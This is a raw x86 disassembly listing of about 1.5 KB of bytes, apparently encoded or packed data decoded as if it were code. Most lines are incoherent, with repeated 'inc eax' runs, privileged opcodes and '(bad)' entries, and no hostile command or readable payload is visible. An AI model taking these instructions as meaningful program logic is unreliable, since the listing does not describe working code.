  41494d:	add    BYTE PTR [eax+0x40],al
  414950:	inc    eax
  414951:	inc    eax
  414952:	inc    eax
  414953:	inc    eax
  414954:	dec    eax
  414955:	lahf   
  414956:	rcl    BYTE PTR [esi+0x10],0x6b
  41495a:	dec    esp
  41495b:	test   DWORD PTR [ecx+0x49],eax
  41495e:	mov    cl,0x21
  414960:	mov    al,ds:0x4721481d
  414965:	fnstsw WORD PTR [eax]
  414967:	add    BYTE PTR [ecx+0x40],al
  41496a:	inc    eax
  41496b:	inc    eax
  41496c:	inc    eax
  41496d:	inc    eax
  41496e:	inc    eax
  41496f:	inc    eax
  414970:	inc    eax
  414971:	inc    eax
  414972:	inc    eax
  414973:	dec    edi
  414974:	push   edx
  414975:	test   al,0x24
  414977:	pop    edi
  414978:	mov    bl,0xfb
  41497a:	gs mov ebp,0xd534124c
  414980:	inc    eax
  414981:	or     esp,edi
  414983:	sbb    BYTE PTR [esi+edi*4+0x40],al
  414987:	pop    edx
  414988:	adc    bl,ch
  41498a:	ins    DWORD PTR es:[edi],dx
  41498b:	inc    ecx
  41498c:	fst    DWORD PTR ds:0x40404031
  414992:	inc    eax
  414993:	inc    eax
  414994:	inc    eax
  414995:	int3   
  414996:	jne    0x4149d8
  414998:	dec    esi
  414999:	xor    al,0x53
  41499b:	ins    BYTE PTR es:[edi],dx
  41499c:	mov    ebp,0xab6cf730
  4149a1:	xor    BYTE PTR [edi],ah
  4149a3:	arpl   WORD PTR [ecx+0x2e],bp
  4149a6:	inc    ebx
  4149a7:	arpl   di,bp
  4149a9:	jae    0x41495a
  4149ab:	mov    ah,0x2
  4149ad:	push   ebp
  4149ae:	push   eax
  4149af:	rcr    BYTE PTR [ebp-0x43],1
  4149b2:	inc    edx
  4149b3:	add    eax,0x40846341
  4149b8:	add    cl,al
  4149ba:	inc    eax
  4149bb:	inc    eax
  4149bc:	inc    eax
  4149bd:	inc    eax
  4149be:	add    BYTE PTR [eax-0x3],al
  4149c1:	and    eax,DWORD PTR [edx+0x23]
  4149c4:	retf   
  4149c5:	mov    ebp,0x6fb9be9f
  4149ca:	mov    bl,0x8
  4149cc:	fld    DWORD PTR [eax+eax*8+0xd]
  4149d0:	out    0x40,eax
  4149d2:	inc    eax
  4149d3:	inc    eax
  4149d4:	inc    eax
  4149d5:	inc    eax
  4149d6:	inc    eax
  4149d7:	inc    eax
  4149d8:	inc    eax
  4149d9:	inc    DWORD PTR [eax-0xa]
  4149dc:	push   eax
  4149dd:	test   eax,0xc94260db
  4149e2:	test   eax,0x62519303
  4149e7:	aas    
  4149e8:	inc    eax
  4149e9:	inc    eax
  4149ea:	inc    eax
  4149eb:	inc    eax
  4149ec:	inc    eax
  4149ed:	inc    eax
  4149ee:	inc    eax
  4149ef:	inc    eax
  4149f0:	inc    eax
  4149f1:	inc    eax
  4149f2:	inc    eax
  4149f3:	es sub ch,al
  4149f6:	fwait
  4149f7:	out    dx,eax
  4149f8:	adc    esp,edi
  4149fa:	addr16 dec eax
  4149fc:	inc    ecx
  4149fd:	aaa    
  4149fe:	xchg   ebp,eax
  4149ff:	dec    ebp
  414a00:	test   al,0x64
  414a02:	sub    bl,cl
  414a04:	sbb    eax,0xda642e6
  414a09:	pop    ebx
  414a0a:	inc    eax
  414a0b:	es adc al,0xa3
  414a0e:	pop    ebx
  414a0f:	outs   dx,DWORD PTR ds:[esi]
  414a10:	int    0x98
  414a12:	inc    eax
  414a13:	mov    ah,0x40
  414a15:	inc    eax
  414a16:	inc    eax
  414a17:	inc    eax
  414a18:	inc    eax
  414a19:	inc    eax
  414a1a:	inc    eax
  414a1b:	inc    eax
  414a1c:	add    BYTE PTR [edx-0x4c],ah
  414a1f:	das    
  414a20:	dec    ebp
  414a21:	adc    eax,0x40054041
  414a26:	cld    
  414a27:	adc    esp,ebx
  414a29:	xor    al,0x9c
  414a2b:	mov    ecx,ebx
  414a2d:	inc    eax
  414a2e:	inc    eax
  414a2f:	inc    eax
  414a30:	inc    eax
  414a31:	inc    eax
  414a32:	inc    eax
  414a33:	and    eax,0x30404040
  414a38:	push   0x74801460
  414a3d:	les    edi,FWORD PTR [ebp+0x6c]
  414a40:	dec    esi
  414a41:	hlt    
  414a42:	loop   0x414a09
  414a44:	inc    eax
  414a45:	dec    edi
  414a46:	dec    eax
  414a47:	add    BYTE PTR [eax+0x10457f2f],dh
  414a4d:	inc    edi
  414a4e:	inc    ecx
  414a4f:	sub    al,0x9b
  414a51:	loop   0x414a09
  414a53:	dec    ecx
  414a54:	imul   ecx,DWORD PTR [ebp-0x6a330a44],0x40
  414a5b:	ror    BYTE PTR [eax+0x40404040],1
  414a61:	inc    eax
  414a62:	inc    eax
  414a63:	inc    eax
  414a64:	inc    eax
  414a65:	inc    eax
  414a66:	inc    eax
  414a67:	aam    0x78
  414a69:	mov    esi,0xf534bd8b
  414a6e:	arpl   WORD PTR [edi],di
  414a70:	sbb    BYTE PTR [esi+0x5f],ah
  414a73:	dec    esp
  414a74:	push   edx
  414a75:	and    ch,0xd8
  414a78:	dec    edi
  414a79:	cwde   
  414a7a:	cmp    esi,ebp
  414a7c:	loop   0x414a9f
  414a7e:	dec    eax
  414a7f:	inc    eax
  414a80:	inc    eax
  414a81:	inc    eax
  414a82:	inc    eax
  414a83:	inc    eax
  414a84:	inc    eax
  414a85:	rol    DWORD PTR [eax+0x40],0x62
  414a89:	fld    QWORD PTR [ebx+0x30]
  414a8c:	cmp    ch,BYTE PTR [ecx]
  414a8e:	add    BYTE PTR [edx+edx*2+0x1e],0x33
  414a93:	pop    esp
  414a94:	push   ecx
  414a95:	dec    eax
  414a96:	arpl   WORD PTR ds:0x772c4148,sp
  414a9c:	fsubr  st(1),st
  414a9e:	inc    eax
  414a9f:	inc    eax
  414aa0:	add    BYTE PTR [eax+0x40],al
  414aa3:	inc    eax
  414aa4:	inc    eax
  414aa5:	inc    eax
  414aa6:	inc    eax
  414aa7:	and    DWORD PTR [edx+0x5a],ebp
  414aaa:	mov    ebp,0x5f931f40
  414aaf:	lods   al,BYTE PTR ds:[esi]
  414ab0:	shr    BYTE PTR gs:[ebx+0x31],0x5
  414ab5:	popa   
  414ab6:	and    DWORD PTR [ebx-0x63],esp
  414ab9:	dec    ebx
  414aba:	pop    edi
  414abb:	ins    BYTE PTR es:[edi],dx
  414abc:	stos   BYTE PTR es:[edi],al
  414abd:	xlat   BYTE PTR ds:[ebx]
  414abe:	inc    ecx
  414abf:	add    ah,BYTE PTR [ebx+0x21]
  414ac2:	cld    
  414ac3:	inc    eax
  414ac4:	inc    eax
  414ac5:	inc    eax
  414ac6:	inc    eax
  414ac7:	inc    eax
  414ac8:	inc    eax
  414ac9:	inc    eax
  414aca:	inc    eax
  414acb:	inc    eax
  414acc:	inc    eax
  414acd:	sbb    eax,0x542140ad
  414ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ad3:	xlat   BYTE PTR ds:[ebx]
  414ad4:	pusha  
  414ad5:	inc    ebx
  414ad6:	aas    
  414ad7:	jne    0x414b55
  414ad9:	arpl   WORD PTR [eax+ebp*4],dx
  414adc:	and    cl,dl
  414ade:	xor    cl,BYTE PTR [esi+0x21]
  414ae1:	lds    ebp,FWORD PTR [eax]
  414ae3:	ja     0x414b61
  414ae5:	(bad)  [eax-0x6f]
  414ae8:	outs   dx,DWORD PTR ds:[esi]
  414ae9:	lds    edi,FWORD PTR [edx-0x2a]
  414aec:	in     al,dx
  414aed:	mov    edi,0x40404040
  414af2:	inc    eax
  414af3:	inc    eax
  414af4:	int3   
  414af5:	jne    0x414b37
  414af7:	xor    al,0x70
  414af9:	inc    esp
  414afa:	dec    edi
  414afb:	xor    al,0x53
  414afd:	fs mov ch,0xa5
  414b00:	adc    BYTE PTR [eax],ah
  414b02:	push   0xffffff80
  414b04:	dec    edi
  414b05:	pusha  
  414b06:	xchg   edx,eax
  414b07:	xor    eax,0xc523042d
  414b0c:	inc    eax
  414b0d:	in     al,dx
  414b0e:	inc    ecx
  414b0f:	inc    eax
  414b10:	add    cl,al
  414b12:	inc    eax
  414b13:	inc    eax
  414b14:	inc    eax
  414b15:	inc    eax
  414b16:	add    BYTE PTR [eax+0x28],al
  414b19:	mov    esi,0x7f436241
  414b1e:	lock inc ebx
  414b20:	retf   0x2054
  414b23:	xor    cl,dh
  414b25:	sub    BYTE PTR [eax+esi*1+0x1f],al
  414b29:	xchg   ebx,eax
  414b2a:	cs sub al,0x58
  414b2d:	inc    ecx
  414b2e:	inc    eax
  414b2f:	inc    eax
  414b30:	inc    eax
  414b31:	inc    eax
  414b32:	inc    eax
  414b33:	inc    eax
  414b34:	inc    eax
  414b35:	inc    eax
  414b36:	inc    DWORD PTR [eax+0x4d]
  414b39:	sub    bh,ch
  414b3b:	inc    eax
  414b3c:	xor    al,0x62
  414b3e:	and    ebp,DWORD PTR fs:[ecx+0x40]
  414b42:	pop    es
  414b43:	shl    cl,1
  414b45:	test   eax,0x40404040
  414b4a:	inc    eax
  414b4b:	inc    eax
  414b4c:	inc    eax
  414b4d:	inc    eax
  414b4e:	inc    eax
  414b4f:	inc    eax
  414b50:	(bad)  
  414b51:	clc    
  414b52:	xor    eax,0x5133f631
  414b57:	inc    esi
  414b58:	test   al,0x62
  414b5a:	pusha  
  414b5b:	ins    BYTE PTR es:[edi],dx
  414b5c:	pop    ebp
  414b5d:	dec    esi
  414b5e:	and    BYTE PTR [ecx],bh
  414b60:	loopne 0x414bbd
  414b62:	in     eax,dx
  414b63:	cmp    dh,bl
  414b65:	aad    0x9
  414b67:	push   ebp
  414b68:	and    bh,BYTE PTR [esp+esi*2+0x409e2643]
  414b6f:	inc    eax
  414b70:	inc    eax
  414b71:	inc    eax
  414b72:	inc    eax
  414b73:	inc    eax
  414b74:	inc    eax
  414b75:	inc    eax
  414b76:	add    BYTE PTR [eax-0x37],al
  414b79:	push   0x70
  414b7b:	inc    esp
  414b7c:	rcr    DWORD PTR [edx+0x4cb4ec91],1
  414b82:	sub    ecx,DWORD PTR [ebp+0x10]
  414b85:	div    BYTE PTR [eax+0x60]
  414b88:	adc    eax,0x8f67dcf4
  414b8d:	xchg   DWORD PTR [eax],esi
  414b8f:	inc    eax
  414b90:	inc    eax
  414b91:	inc    eax
  414b92:	inc    eax
  414b93:	inc    eax
  414b94:	inc    eax
  414b95:	and    eax,0x2c404040
  414b9a:	inc    ecx
  414b9b:	inc    eax
  414b9c:	aam    0x80
  414b9e:	cli    
  414b9f:	dec    ebx
  414ba0:	pop    ds
  414ba1:	popa   
  414ba2:	inc    esi
  414ba3:	dec    esp
  414ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ba5:	inc    BYTE PTR ds:0xd8674547
  414bab:	and    al,0x46
  414bad:	dec    edi
  414bae:	inc    ecx
  414baf:	adc    dh,BYTE PTR [ecx+eiz*4]
  414bb2:	dec    ebp
  414bb3:	dec    esi
  414bb4:	fsub   QWORD PTR [esi+0x43]
  414bb7:	ins    BYTE PTR es:[edi],dx
  414bb8:	popf   
  414bb9:	push   ebp
  414bba:	leave  
  414bbb:	inc    eax
  414bbc:	inc    eax
  414bbd:	inc    eax
  414bbe:	inc    eax
  414bbf:	inc    eax
  414bc0:	inc    eax
  414bc1:	inc    eax
  414bc2:	inc    eax
  414bc3:	inc    eax
  414bc4:	inc    eax
  414bc5:	arpl   WORD PTR [ebx-0x3d],bp
  414bc8:	xor    BYTE PTR [ebx+0x48bc226f],dl
  414bce:	cdq    
  414bcf:	sub    eax,0x2941a724
  414bd4:	or     eax,0x40f3f341
  414bd9:	cmp    eax,0x3dcb43f5
  414bde:	jl     0x414b88
  414be0:	xor    ecx,edx
  414be2:	inc    eax
  414be3:	inc    eax
  414be4:	inc    eax
  414be5:	inc    eax
  414be6:	inc    eax
  414be7:	inc    eax
  414be8:	rol    DWORD PTR [eax+0x40],0xc3
  414bec:	mov    al,ds:0x12a26852
  414bf1:	ins    BYTE PTR es:[edi],dx
  414bf2:	or     eax,0x65353318
  414bf7:	push   esp
  414bf8:	mov    edi,0x3921c3d7
  414bfd:	inc    eax
  414bfe:	inc    eax
  414bff:	add    BYTE PTR [eax+0x40],al
  414c02:	inc    eax
  414c03:	inc    eax
  414c04:	inc    eax
  414c05:	inc    eax
  414c06:	inc    esp
  414c07:	fadd   QWORD PTR ds:0x47a84342
  414c0d:	loope  0x414c76
  414c0f:	ss jne 0x414c91
  414c12:	shl    DWORD PTR [edx+0x51],1
  414c15:	xor    eax,0x4005fc1c
  414c1a:	mov    eax,ds:0x624d51f6
  414c1f:	jg     0x414c83
  414c21:	(bad)  
  414c22:	iret   
  414c23:	retf   
  414c24:	mov    cl,0x40
  414c26:	inc    eax
  414c27:	inc    eax
  414c28:	inc    eax
  414c29:	inc    eax
  414c2a:	inc    eax
  414c2b:	inc    eax
  414c2c:	inc    eax
  414c2d:	inc    eax
  414c2e:	inc    eax
  414c2f:	add    DWORD PTR [edx+0x70],eax
  414c32:	inc    esi
  414c33:	scas   al,BYTE PTR es:[edi]
  414c34:	and    edi,DWORD PTR [eax+eax*2]
  414c37:	jmp    0x81b7b324
  414c3c:	sbb    al,cl
  414c3e:	jo     0x414bc1
  414c40:	mov    bl,BYTE PTR [edx+0x2941b8e1]
  414c46:	sub    ebp,DWORD PTR [eax+ebp*4]
  414c49:	mov    esp,0xec523539
  414c4e:	add    eax,DWORD PTR cs:[eax+0x40]
  414c52:	inc    eax
  414c53:	inc    eax
  414c54:	inc    eax
  414c55:	inc    eax
  414c56:	int3   
  414c57:	jne    0x414c99
  414c59:	adc    BYTE PTR [edx-0x30],al
  414c5c:	retf   
  414c5d:	and    BYTE PTR [edi],cl
  414c5f:	push   ss
  414c60:	inc    eax
  414c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c62:	les    esp,FWORD PTR [edx-0x41]
  414c65:	and    BYTE PTR [edx],ch
  414c67:	xor    al,BYTE PTR [eax]
  414c69:	inc    ecx
  414c6a:	imul   edi,DWORD PTR [ebp+ecx*1+0x40],0xffffffb9
  414c6f:	inc    eax
  414c70:	add    cl,al
  414c72:	inc    eax
  414c73:	inc    eax
  414c74:	inc    eax
  414c75:	inc    eax
  414c76:	add    BYTE PTR [eax+0x6e],al
  414c79:	xor    esp,DWORD PTR [edi]
  414c7b:	add    BYTE PTR [edi+0x505331c8],ch
  414c81:	ins    DWORD PTR es:[edi],dx
  414c82:	rcl    BYTE PTR [eax+0x25],0x48
  414c86:	ins    BYTE PTR es:[edi],dx
  414c87:	adc    dh,BYTE PTR [ecx+0x0]
  414c8a:	shr    DWORD PTR [si],0xca
  414c8e:	hlt    
  414c8f:	mov    ebx,0xfa482cc3
  414c94:	mov    al,0xb4
  414c96:	inc    ebx
  414c97:	aam    0xdb
  414c99:	fild   DWORD PTR [eax+0x40]
  414c9c:	inc    eax
  414c9d:	inc    eax
  414c9e:	inc    eax
  414c9f:	inc    eax
  414ca0:	inc    eax
  414ca1:	inc    eax
  414ca2:	inc    DWORD PTR [eax-0x30]
  414ca5:	xor    BYTE PTR [eax+0x6a8ed105],ch
  414cab:	add    DWORD PTR [edi],ecx
  414cad:	push   ebp
  414cae:	or     ecx,ebx
  414cb0:	adc    esi,esi
  414cb2:	jno    0x414c69
  414cb4:	inc    eax
  414cb5:	inc    eax
  414cb6:	inc    eax
  414cb7:	inc    eax
  414cb8:	inc    eax
  414cb9:	inc    eax
  414cba:	inc    eax
  414cbb:	inc    eax
  414cbc:	inc    eax
  414cbd:	inc    eax
  414cbe:	popf   
  414cbf:	xor    al,0x33
  414cc1:	jnp    0x414ceb
  414cc3:	push   eax
  414cc4:	inc    ebx
  414cc5:	adc    al,0xe6
  414cc7:	pop    ebp
  414cc8:	bound  ecx,QWORD PTR [ebx+0x76]
  414ccb:	xchg   edx,eax
  414ccc:	nop
  414ccd:	push   es
  414cce:	sub    bh,BYTE PTR [esi]
  414cd0:	outs   dx,BYTE PTR ds:[esi]
  414cd1:	pop    esi
  414cd2:	pop    ebx
  414cd3:	mov    al,ds:0x6a417cba
  414cd8:	inc    esp
  414cd9:	les    ebp,FWORD PTR [eax]
  414cdb:	xchg   esp,eax
  414cdc:	nop
  414cdd:	inc    esp
  414cde:	and    BYTE PTR [edx+eiz*2],dh
  414ce1:	dec    esp
  414ce2:	inc    eax
  414ce3:	inc    eax
  414ce4:	inc    eax
  414ce5:	inc    eax
  414ce6:	inc    eax
  414ce7:	inc    eax
  414ce8:	inc    eax
  414ce9:	inc    eax
  414cea:	add    BYTE PTR [edx+0x1],al
  414ced:	rol    BYTE PTR [eax],1
  414cef:	call   0x1a56c334
  414cf4:	in     eax,0xfd
  414cf6:	and    cl,BYTE PTR [ebp-0x44]
  414cf9:	and    al,0xc9
  414cfb:	adc    BYTE PTR [edi+0x41c92a21],ah
  414d01:	inc    esi
  414d02:	inc    ecx
  414d03:	bound  eax,QWORD PTR [eax+0x40]
  414d06:	inc    eax
  414d07:	inc    eax
  414d08:	inc    eax
  414d09:	inc    eax
  414d0a:	and    eax,0xa4404040
  414d0f:	dec    esp
  414d10:	add    ebp,DWORD PTR [eax+0x40aa94b1]
  414d16:	xchg   edi,eax
  414d17:	lahf   
  414d18:	das    
  414d19:	or     eax,0x30c355c4
  414d1e:	or     BYTE PTR [eax+0xb],al
  414d21:	inc    edx
  414d22:	dec    eax
  414d23:	pusha  
  414d24:	dec    esp
  414d25:	ins    BYTE PTR es:[edi],dx
  414d26:	mov    WORD PTR [ecx-0x3fb3f0c0],ss
  414d2c:	adc    eax,0x8533be91
  414d31:	adc    BYTE PTR ds:0x40404042,ah
  414d37:	inc    eax
  414d38:	inc    eax
  414d39:	inc    eax
  414d3a:	inc    eax
  414d3b:	inc    eax
  414d3c:	inc    eax
  414d3d:	inc    eax
  414d3e:	retf   
  414d3f:	inc    ebx
  414d40:	div    ecx
  414d42:	push   cs
  414d43:	bound  ecx,QWORD PTR [ecx-0x142e4fdb]
  414d49:	inc    eax
  414d4a:	sub    ah,0x2f
  414d4d:	jns    0x414d96
  414d4f:	add    ebx,DWORD PTR [eax]
  414d51:	shr    edi,1
  414d53:	jecxz  0x414dab
  414d55:	inc    esi
  414d56:	sub    BYTE PTR gs:[esi+0x4f],dl
  414d5a:	add    ch,BYTE PTR [esi+eiz*1-0x6ba3a76b]
  414d61:	inc    eax
  414d62:	inc    eax
  414d63:	inc    eax
  414d64:	inc    eax
  414d65:	inc    eax
  414d66:	inc    eax
  414d67:	rol    DWORD PTR [eax+0x40],0xb3
  414d6b:	inc    eax
  414d6c:	add    eax,0xa6636b2a
  414d71:	xchg   BYTE PTR [ecx+0x63],cl
  414d74:	retf   
  414d75:	add    al,BYTE PTR [edx-0x4c]
  414d78:	sub    ch,al
  414d7a:	cdq    
  414d7b:	fisub  WORD PTR [ebx+ebp*4+0x30]
  414d7f:	add    eax,0x4040b242
  414d84:	add    BYTE PTR [eax+0x40],al
  414d87:	inc    eax
  414d88:	inc    eax
  414d89:	inc    eax
  414d8a:	inc    eax
  414d8b:	dec    esp
  414d8c:	mov    al,ds:0x330bb843
  414d91:	ins    DWORD PTR es:[edi],dx
  414d92:	jg     0x414dcf
  414d94:	jne    0x414d66
  414d96:	inc    ecx
  414d97:	inc    esi
  414d98:	jmp    0x2930:0xe53fc63c
  414d9f:	xchg   ebp,eax
  414da0:	bound  esp,QWORD PTR [edx+0x1]
  414da3:	dec    esp
  414da4:	aas    
  414da5:	jbe    0x414de3
  414da7:	ins    DWORD PTR es:[edi],dx
  414da8:	push   ss
  414da9:	inc    esp
  414daa:	inc    eax
  414dab:	inc    eax
  414dac:	inc    eax
  414dad:	inc    eax
  414dae:	inc    eax
  414daf:	inc    eax
  414db0:	inc    eax
  414db1:	inc    eax
  414db2:	inc    eax
  414db3:	inc    eax
  414db4:	mov    ebp,0xc2005f3f
  414db9:	inc    edx
  414dba:	mov    ds:0x89692450,al
  414dbf:	arpl   WORD PTR [eax+edx*8-0x37],sp
  414dc3:	imul   ebx,DWORD PTR [esi-0xb],0xffffffcb
  414dc7:	bound  esp,QWORD PTR cs:[eax]
  414dca:	sbb    al,0xab
  414dcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dcd:	push   0x11
  414dcf:	ja     0x414e34
  414dd1:	inc    esi
  414dd2:	inc    esp
  414dd3:	scas   al,BYTE PTR es:[edi]
  414dd4:	mov    ebx,0x9c0957f1
  414dd9:	xchg   ebp,eax
  414dda:	inc    ecx
  414ddb:	inc    eax
  414ddc:	inc    eax
  414ddd:	inc    eax
  414dde:	inc    eax
  414ddf:	inc    eax
  414de0:	inc    eax
  414de1:	int3   
  414de2:	jne    0x414e24
  414de4:	inc    ebx
  414de5:	cwde   
  414de6:	xchg   esp,eax
  414de7:	inc    eax
  414de8:	arpl   WORD PTR [eax+0x71],cx
  414deb:	shr    BYTE PTR [bx+di],cl
  414dee:	xor    eax,0x2d45f386
  414df3:	pop    es
  414df4:	sbb    BYTE PTR [eax-0x42db8b31],ah
  414dfa:	xor    eax,0x518b413c
  414dff:	inc    eax
  414e00:	fs push 0x46
  414e03:	bound  esp,QWORD PTR ds:0x7706570e
  414e09:	inc    eax
  414e0a:	add    cl,al
  414e0c:	inc    eax
  414e0d:	inc    eax
  414e0e:	inc    eax
  414e0f:	inc    eax
  414e10:	add    BYTE PTR [eax+0x58],al
  414e13:	xchg   esi,eax
  414e14:	inc    ecx
  414e15:	adc    esi,ecx
  414e17:	jb     0x414e23
  414e19:	mov    BYTE PTR [eax+0x67],ah
  414e1c:	mov    esp,0x132f1828
  414e21:	imul   eax,DWORD PTR fs:[eax+0x7a],0x42
  414e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e27:	inc    ebp
  414e28:	cmp    dl,BYTE PTR [ecx]
  414e2a:	inc    ebp
  414e2b:	inc    eax
  414e2c:	mov    ah,0x1a
  414e2e:	or     ebx,edx
  414e30:	xchg   DWORD PTR [eax+eax*4+0x40400d40],ebp
  414e37:	inc    eax
  414e38:	inc    eax
  414e39:	inc    eax
  414e3a:	inc    eax
  414e3b:	inc    eax
  414e3c:	inc    eax
  414e3d:	inc    DWORD PTR [eax-0x68]
  414e40:	lods   eax,DWORD PTR ds:[esi]
  414e41:	mov    ebp,0xf238201d
  414e46:	leave  
  414e47:	bound  ebx,QWORD PTR [esi]
  414e49:	and    eax,DWORD PTR [ebx]
  414e4b:	jbe    0x414e70
  414e4d:	inc    ecx
  414e4e:	inc    edx
  414e4f:	inc    eax
  414e50:	retf   0x9f3
  414e53:	push   ebx
  414e54:	or     eax,0xd0304146
  414e59:	dec    esp
  414e5a:	mov    ebp,ecx
  414e5c:	bound  edx,QWORD PTR [ecx+eax*2-0x308dcb94]
  414e63:	adc    al,0x40
  414e65:	inc    eax
  414e66:	inc    eax
  414e67:	inc    eax
  414e68:	inc    eax
  414e69:	inc    eax
  414e6a:	inc    eax
  414e6b:	inc    eax
  414e6c:	inc    eax
  414e6d:	inc    eax
  414e6e:	int3   
  414e6f:	push   0x10174bbc
  414e74:	dec    eax
  414e75:	xor    al,0x68
  414e77:	pushf  
  414e78:	jbe    0x414ebd
  414e7a:	fwait
  414e7b:	dec    esi
  414e7c:	add    eax,0xf79c6b80
  414e81:	inc    eax
  414e82:	inc    eax
  414e83:	inc    eax
  414e84:	inc    eax
  414e85:	inc    eax
  414e86:	inc    eax
  414e87:	inc    eax
  414e88:	inc    eax
  414e89:	add    cl,dl
  414e8b:	push   0xffffffd1
  414e8d:	add    eax,ebp
  414e8f:	or     DWORD PTR [ebx+0x41],edx
  414e92:	stos   BYTE PTR es:[di],al
  414e94:	xor    al,0x84
  414e96:	inc    edx
  414e97:	and    BYTE PTR [edx-0x43],al
  414e9a:	out    dx,al
  414e9b:	jae    0x414f0e
  414e9d:	xor    BYTE PTR [eax+0x62],ch
  414ea0:	inc    eax
  414ea1:	inc    eax
  414ea2:	inc    eax
  414ea3:	inc    eax
  414ea4:	inc    eax
  414ea5:	inc    eax
  414ea6:	and    eax,0x76404040
  414eab:	push   ebx
  414eac:	sub    ecx,DWORD PTR [esi]
  414eae:	addr16 jmp 0x414e81
  414eb1:	stos   DWORD PTR es:[edi],eax
  414eb2:	aad    0x60
  414eb4:	addr16 leave 
  414eb6:	adc    al,BYTE PTR [edx+0x34584df6]
  414ebc:	sub    BYTE PTR [eax+0x17],al
  414ebf:	ins    DWORD PTR es:[edi],dx
  414ec0:	adc    bh,ch
  414ec2:	in     al,dx
  414ec3:	inc    ecx
  414ec4:	inc    edx
  414ec5:	inc    eax
  414ec6:	inc    eax
  414ec7:	inc    eax
  414ec8:	inc    eax
  414ec9:	inc    eax
  414eca:	inc    eax
  414ecb:	inc    eax
  414ecc:	inc    eax
  414ecd:	inc    eax
  414ece:	inc    eax
  414ecf:	inc    eax
  414ed0:	sub    eax,0x5425a84a
  414ed5:	mov    ebp,0x1d2400f
  414eda:	push   ds
  414edb:	test   al,0x8e
  414edd:	jno    0x414f33
  414edf:	or     al,0x9d
  414ee1:	inc    eax
  414ee2:	inc    eax
  414ee3:	inc    eax
  414ee4:	inc    eax
  414ee5:	inc    eax
  414ee6:	inc    eax
  414ee7:	rol    DWORD PTR [eax+0x40],0x46
  414eeb:	fild   WORD PTR [eax+0x40626946]
  414ef1:	xor    BYTE PTR [eax],al
  414ef3:	bound  ebp,QWORD PTR [edx]
  414ef5:	xchg   ebp,eax
  414ef6:	fadd   QWORD PTR [eax+0x12]
  414ef9:	inc    edx
  414efa:	xor    ch,BYTE PTR [edx]
  414efc:	inc    ecx
  414efd:	lds    ebp,FWORD PTR [edx+0x30]
  414f00:	inc    eax
  414f01:	xor    BYTE PTR [esi+0x4040dc98],dl
  414f07:	add    BYTE PTR [eax+0x40],al
  414f0a:	inc    eax
  414f0b:	inc    eax
  414f0c:	inc    eax
  414f0d:	inc    eax
  414f0e:	pusha  
  414f0f:	enter  0x156c,0x32
  414f13:	push   ebx
  414f14:	xor    al,0xd3
  414f16:	arpl   WORD PTR [ebp+0x68],bp
  414f19:	inc    eax
  414f1a:	pop    ecx
  414f1b:	add    BYTE PTR [ecx+eiz*8+0x6e4368f0],bh
  414f22:	nop
  414f23:	sub    eax,0x6829a864
  414f28:	rol    DWORD PTR [eax+0x60],1
  414f2b:	dec    eax
  414f2c:	inc    ecx
  414f2d:	jp     0x414f4f
  414f2f:	mov    al,0x40
  414f31:	inc    eax
  414f32:	inc    eax
  414f33:	inc    eax
  414f34:	inc    eax
  414f35:	inc    eax
  414f36:	inc    eax
  414f37:	inc    eax
  414f38:	inc    eax
  414f39:	inc    eax
  414f3a:	add    al,0xe
  414f3c:	adc    BYTE PTR [ebp-0x3ca5fc8c],al
  414f42:	rol    DWORD PTR [eax-0x2f],1
  414f45:	jno    0x414ed4
  414f47:	(bad)  
  414f49:	mov    eax,0x210ff1
  414f4e:	push   0x6605a95a
  414f53:	inc    eax
  414f54:	xor    dh,BYTE PTR [edx+0x1e]
  414f57:	ins    BYTE PTR es:[edi],dx
  414f58:	mov    eax,0x270941cb
  414f5d:	inc    eax
  414f5e:	inc    eax
  414f5f:	inc    eax
  414f60:	inc    eax
  414f61:	inc    eax
  414f62:	inc    eax
  414f63:	int3   
  414f64:	jne    0x414fa6
  414f66:	inc    eax
  414f67:	or     al,0x3d
  414f69:	das    
  414f6a:	add    BYTE PTR [edi+0x40],0x16
  414f6e:	jp     0x414fd3
  414f70:	inc    edi
  414f71:	inc    ebx
  414f72:	stos   DWORD PTR es:[edi],eax
  414f73:	and    al,0x14
  414f75:	dec    eax
  414f76:	in     al,dx
  414f77:	dec    esi
  414f78:	inc    eax
  414f79:	add    cl,al
  414f7b:	inc    eax
  414f7c:	inc    eax
  414f7d:	inc    eax
  414f7e:	inc    eax
  414f7f:	add    BYTE PTR [eax+0x3c],al
  414f82:	inc    ebx
  414f83:	inc    esp
  414f84:	or     al,0x40
  414f86:	rol    DWORD PTR [ecx+0x3e5830d0],cl
  414f8c:	inc    eax
  414f8d:	add    ebp,DWORD PTR [edx]
  414f8f:	inc    eax
  414f90:	inc    eax
  414f91:	inc    eax
  414f92:	inc    eax
  414f93:	inc    eax
  414f94:	inc    eax
  414f95:	inc    eax
  414f96:	inc    eax
  414f97:	inc    DWORD PTR [eax-0xf]
  414f9a:	push   cs
  414f9b:	rol    DWORD PTR [esi+0x74],0x31
  414f9f:	inc    eax
  414fa0:	xchg   edi,eax
  414fa1:	pop    ecx
  414fa2:	sbb    ebp,DWORD PTR [eax+0x156c67fc]
  414fa8:	xchg   DWORD PTR [edx-0x4797efa7],eax
  414fae:	inc    eax
  414faf:	inc    eax
  414fb0:	inc    eax
  414fb1:	inc    eax
  414fb2:	inc    eax
  414fb3:	inc    eax
  414fb4:	inc    eax
  414fb5:	inc    eax
  414fb6:	inc    eax
  414fb7:	inc    eax
  414fb8:	add    eax,0x6325f240
  414fbd:	mov    esp,0x12430dac
  414fc2:	xor    eax,0xc342dc78
  414fc7:	leave  
  414fc8:	rol    DWORD PTR [eax+0x50],1
  414fcb:	sub    ah,0x40
  414fce:	dec    esi
  414fcf:	inc    eax
  414fd0:	cmp    dl,BYTE PTR [eax+edx*1]
  414fd3:	ins    DWORD PTR es:[edi],dx
  414fd4:	arpl   WORD PTR [eax],dx
  414fd6:	ds inc eax
  414fd8:	inc    eax
  414fd9:	inc    eax
  414fda:	inc    eax
  414fdb:	inc    eax
  414fdc:	inc    eax
  414fdd:	inc    eax
  414fde:	inc    eax
  414fdf:	add    BYTE PTR [ecx],al
  414fe1:	out    0x40,eax
  414fe3:	and    DWORD PTR [ebp+0x45],eax
  414fe6:	imul   ebp,DWORD PTR [ecx-0x40],0xfffffff6
  414fea:	adc    eax,DWORD PTR [ebp+0x0]
  414fed:	ret    
